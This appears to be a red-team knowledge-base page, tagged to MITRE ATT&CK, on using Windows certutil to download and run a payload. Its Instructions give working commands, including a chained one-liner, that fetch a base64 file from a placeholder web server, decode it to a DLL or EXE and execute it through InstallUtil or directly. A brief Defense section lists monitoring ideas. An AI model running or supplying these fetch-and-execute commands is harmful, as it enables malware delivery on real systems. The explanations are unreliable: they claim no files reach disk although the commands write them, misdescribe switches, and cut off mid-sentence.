---
id: b1d96116-4420-4541-a6df-96251b7b4649
name: Certutil Download and Execute
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.024568+00:00'
updated_at: '2023-04-10T20:37:10.623315+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[User Execution|T1204 - User Execution]]'
sub_techniques:
- '[[Malicious File|T1204.002 - Malicious File]]'
tags:
- '[[Certutil]]'
- '[[Windows - Download and execute methods]]'
commands:
- '[[Decode payload.b64 to payload.dll]]'
- '[[Download and decode payload from web server]]'
- '[[Download payload.b64 from webserver]]'
- '[[Install payload.dll as a service]]'
---

# Certutil Download and Execute

## Summary

Certutil is a command-line utility that is installed as part of Certificate Services. It can be used to download and install certificates, certificate revocation lists, and certificate chains. However, it can also be used to download and execute a payload from a remote server. This technique is com

## Description

# Description

Certutil is a command-line utility that is installed as part of Certificate Services. It can be used to download and install certificates, certificate revocation lists, and certificate chains. However, it can also be used to download and execute a payload from a remote server. This technique is commonly used by attackers to bypass security controls and execute malicious code on a target system.

To execute a payload using Certutil, the attacker first downloads the payload to the target system using Certutil's -urlcache switch. They then execute the payload using Certutil's -decode switch, which decodes the payload and saves it to a file on the target system. Finally, they execute the decoded payload using the command prompt.

This technique allows an attacker to execute code on a target system without writing any files to disk, making it difficult for security tools to detect the attack.

 

## Requirements

1. Access to the command prompt

 

## Defense

1. Monitor for any suspicious use of Certutil, especially the use of the -urlcache and -decode switches.

1. Implement application control to prevent the execution of Certutil.exe from non-standard locations.

1. Monitor for any unusual network traffic, especially traffic to known malicious domains.

 

## Objectives

1. Download and execute a payload on a target system

 

# Instructions

1. This command downloads a payload from a web server and executes it on the target system. The command uses certutil to download the payload and decode it from base64 format. The decoded payload is then saved to a DLL file and executed using InstallUtil.

 



**Code**: [[certutil -urlcache -split -f http://webserver/payl]]



> The command consists of three parts:
1. certutil -urlcache -split -f http://webserver/payload.b64 payload.b64: This command downloads the payload from the specified URL and saves it to a file named payload.b64.
2. certutil -decode payload.b64 payload.dll: This command decodes the payload from base64 format and saves it to a DLL file named payload.dll.
3. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll: This command executes the payload by using InstallUtil, which is a Windows utility used to install and uninstall .NET assemblies.



**Command** ([[Download payload.b64 from webserver]]):

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
```





**Command** ([[Decode payload.b64 to payload.dll]]):

```bash
certutil -decode payload.b64 payload.dll
```





**Command** ([[Install payload.dll as a service]]):

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```



2. This command downloads a payload from a remote server and executes it on the local machine. The payload is first downloaded in base64 format and then decoded and saved as an executable file before being executed.

 



**Code**: [[certutil -urlcache -split -f http://webserver/payl]]



> The 'certutil' command is used to download the payload from the specified URL and save it as a base64 encoded file named 'payload.b64'. The '-urlcache' option is used to download the file and '-split' option is used to split the file into multiple chunks for faster download. The '-f' option is used to overwrite an existing file with the same name.

The downloaded file is then decoded using the 'certutil' command with the '-decode' option. The base64 encoded file 'payload.b64' is decoded and saved as an executable file named 'payload.exe'.

Finally, the decoded payload is executed using the command 'payload.exe'.



**Command** ([[Download and decode payload from web server]]):

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```



## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[User Execution|T1204 - User Execution]]

### Sub-Techniques

- [[Malicious File|T1204.002 - Malicious File]]

## Commands Used

- [[Decode payload.b64 to payload.dll]]
- [[Download and decode payload from web server]]
- [[Download payload.b64 from webserver]]
- [[Install payload.dll as a service]]

## Tags

- [[Certutil]]
- [[Windows - Download and execute methods]]


